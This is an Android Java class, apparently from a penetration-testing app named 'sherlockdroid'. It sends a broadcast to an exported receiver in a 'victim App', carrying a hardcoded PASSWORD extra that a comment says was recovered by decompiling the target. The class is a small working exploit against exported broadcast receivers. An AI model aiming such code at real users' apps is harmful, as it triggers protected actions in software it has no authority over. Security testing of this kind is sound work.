package com.example.sherlockdroid.tools;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.example.sherlockdroid.R;

public class ExportedReceiver extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        String PACKAGE = getIntent().getStringExtra("Package");
        String Receiver= getIntent().getStringExtra("Receiver");
        String ReceiverACTION = getIntent().getStringExtra("ReceiverACTION");
        Log.v("PACKAGE",PACKAGE);
        Log.v("Receiver",Receiver);
        Log.v("ReceiverACTION",ReceiverACTION);
        Intent intent = new Intent(ReceiverACTION);
        intent.putExtra("PASSWORD", "1000"); //il PASSWORD è un parametro che vedi nel jd gui ---> paramIntent.getStringExtra("PASSWORD")
        sendBroadcast(intent);
        Toast info=Toast.makeText(this,"Send Broadcast to the victim App",Toast.LENGTH_SHORT);
        info.show();
    }



}
